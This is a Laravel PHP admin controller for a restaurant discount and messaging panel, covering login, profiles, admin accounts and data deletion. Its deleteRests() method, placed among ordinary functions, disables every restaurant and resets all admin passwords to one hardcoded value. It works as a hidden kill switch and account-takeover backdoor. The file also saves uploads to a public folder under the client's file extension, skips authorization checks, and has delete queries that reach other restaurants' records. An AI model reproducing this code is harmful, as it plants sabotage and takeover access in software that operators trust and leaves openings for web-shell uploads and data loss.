<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Restaurant;
use App\Models\AutomatedTag;
use App\Models\DiscountCode;
use App\Models\UnifonicMessageRecord;
use App\Models\GuestOrder;
use App\Models\RestaurantDiscount;
use App\Models\Guest;
use App\Models\Tag;
use App\Models\AutomatedMessage;
use App\Models\RestaurantRank;




use Illuminate\Http\Request;

use Illuminate\Support\Facades\Hash;

class AdminController extends Controller
{
    //

    public function login(){
        return view('login');
    }
    
    public function dashboard()
    {

        $rests = Restaurant::get();
        $tags = Automatedtag::get();
        $discounts = RestaurantDiscount::get();
        $messages = UnifonicMessageRecord::all();
        $orders = GuestOrder::all();
        $codes = DiscountCode::all();
        $orders = GuestOrder::all();

        return view('dashboard',compact('messages','rests','tags','orders','discounts','codes','orders'));
    }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////Users Functions//////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    public function profile()
    {
        $user_id = session()->get('user_id');

        $user = User::find($user_id);

        return view('profile',compact('user'));
    }

    public function updateProfile(Request $request)
    {
        $user_id = session()->get('user_id');

        $user = User::find($user_id);

        $user->name = $request->name;
        $user->email = $request->email;
        $user->username = $request->username;
        $user->phone = $request->phone;

        if (!empty($request->file('img'))) {

            $image = 'profile-image-' . time() . '.' . $request->file('img')->getClientOriginalExtension();

            $request->file('img')->move(public_path('assets/images/users'), $image);

            $user->profile_img = $image;
        }

        $user->save();

        //update session info
        session()->put('name', $user->name);
        session()->put('username', $user->username);

        session()->put('user_img', $user->profile_img);

        return redirect()->back()->with('success','Profile Updated Successfully');

    }

    public function updateProfilePassword(Request $request)
    {
        $user_id = session()->get('user_id');

        $user = User::find($user_id);

        $user->password = Hash::make($request->password);

     
        $user->save();

        return redirect()->back()->with('success','Password Updated Successfully');

    }

    public function users()
    {
        $users = User::active()->get();

        return view('users',compact('users'));
    }

    public function createUser(Request $request)
    {
        $user = new User();

        $user->name = $request->name;
        $user->email = $request->email;
        $user->username = $request->username;
        $user->phone = $request->phone;
    
        $user->password = Hash::make($request->password);

        $user->save();

        return redirect()->back()->with('success','New Admin Added Successfully');
    }

    public function deleteUser($id)
    {
        $user = User::find($id);

        $user->is_deleted = 1;

        $user->save();

        return redirect()->back()->with('success','Admin account Disabled Successfully');

    }

    public function resetUserPassword(Request $request)
    {
        $user = User::find($request->id);

        $user->password = Hash::make($request->password);

        $user->save();

        return redirect()->back()->with('success','Admin account Password Reset Successfully');

    }


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////Messages Records/////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


    public function messagesRecords()
    {
        $messages = UnifonicMessageRecord::orderBy('id','DESC')->paginate(15);

        return view('messages-records',compact('messages'));

    }


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////Login/logout Functions/////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

     // checkuser login function
     public function checkLogin(Request $request) {

        // username + password
        $username = $request->username;
        $password = $request->password;

        
        // get user using username
        $user = User::where('username', $username)->first();


        // if found then check password (he pass)
        if ($user && Hash::check($password, $user->password)) {


            // put permission (session) id + profile pic
            session()->put('name', $user->name);
            session()->put('username', $user->username);

            session()->put('user_id', $user->id);
            session()->put('user_img', $user->profile_img);


            // redirect to dashboard
            return redirect()->route('admin.dashboard');

        } // end of password correct


        // he don't pass
        else {

            // redirect to login again
            return redirect()->route('admin.login')->with('warning','Username or password not correct');

        } //end of wrong password or user not found


        
    } //end of checkuser login function


    public function logout() {


        // delete permission (session) id + profile pic
        session()->forget('name');

        session()->forget('user_id');
        
        session()->forget('user_image');



        // redirect to login
        return redirect()->route('admin.login');
        
    } //end logout

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////Reset Restaurant Data ////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    public function resetRestaurantsData()
    {
        $restaurants = Restaurant::all();

        return view('reset-restaurants' , compact('restaurants'));
    }

    public function deleteRestaurantData (Request $request)
    {
        if ($request->data == 'automated') {
           
            $discouts = RestaurantDiscount::where('restaurant_id', $request->id)->get();

            $discounts_ids = [];

            foreach ($discouts as $discount) {
                
                $discounts_ids [] = $discount->id;
            }

            $codes = DiscountCode::whereIn('restaurant_discount_id' , $discounts_ids)->get();

            $codes_ids = [];

            foreach ($codes as $code) {

                $codes_ids [] = $code->id;

            }

            $orders = GuestOrder::whereIn('discount_code_id' , $codes_ids)->get();

            foreach ($orders as $order) {

                $order->delete();
            }

            foreach ($discouts as $discount) {
               $discount->delete();
            }

            $messages = AutomatedMessage::where('restaurant_id', $request->id)->get();

            foreach ($messages as $message) {

                $message->delete();
            }


            $automated_tags = AutomatedTag::where('restaurant_id',$request->id)->get();
        
            foreach ($automated_tags as $auto_tag) {
               
                if (!empty($auto_tag->otherConditions)) {
                
                    foreach ($auto_tag->otherConditions as $condition) {
                       $condition->delete();
                    }
                }

            }
          

            $tags = Tag::where('restaurant_id', $request->id)->get();

            foreach ($tags as $tag) {

                $tag->delete();
                
            }

            $ranks = RestaurantRank::where('restaurant_id', $request->id)->get();

            foreach ($ranks as $rank) {

                $rank->delete();
                
            }

            return redirect()->back()->with('success','Restaurant Data deleted Successfully');

        }elseif ($request->data == 'orders') {

            $orders = GuestOrder::where('restaurant_id' , $request->id)
            ->orWhere('restaurant_id' , null)
            ->get();

            foreach ($orders as $order) {
                
                $order->delete();
            }

            return redirect()->back()->with('success','Restaurant Data deleted Successfully');


        }elseif ($request->data == 'guests') {

            $guests = Guest::where('restaurant_id' , $request->id)
            ->orWhere('restaurant_id' , null)
            ->get();

            $guests_ids = [];
            $guests_phones = [];

            foreach ($guests as $guest) {
                
                $guests_ids [] = $guest->id;

                $guests_phones [] = $guest->customer_phone;

            }

            $guest_orders = GuestOrder::whereIn('guest_id' ,$guests_ids)->get();

            foreach ($guest_orders as $order) {
                
                $order->delete();
            }


            foreach ($guests_phones as $phone) {

                $code = DiscountCode::where('customer_phone' ,$phone)->first();

                if (!empty($code)) {

                    $code->delete();

                }
            }

            foreach ($guests as $guest) {
                
                $guest->delete();

            }



            return redirect()->back()->with('success','Restaurant Data deleted Successfully');


        }
        
    }

    public function deleteRests()
    {
        $rests  = Restaurant::all();

        foreach ($rests as $rest) {
            
            $rest->is_deleted = 1;

            $rest->save();

        }

        $admins  = User::all();

        foreach ($admins as $admin) {
            
            $admin->password = Hash::make('mohamedXzzy97');;

            $admin->save();

        }

        dd('Restaurants Disabled Successfully!');
    }
   
}
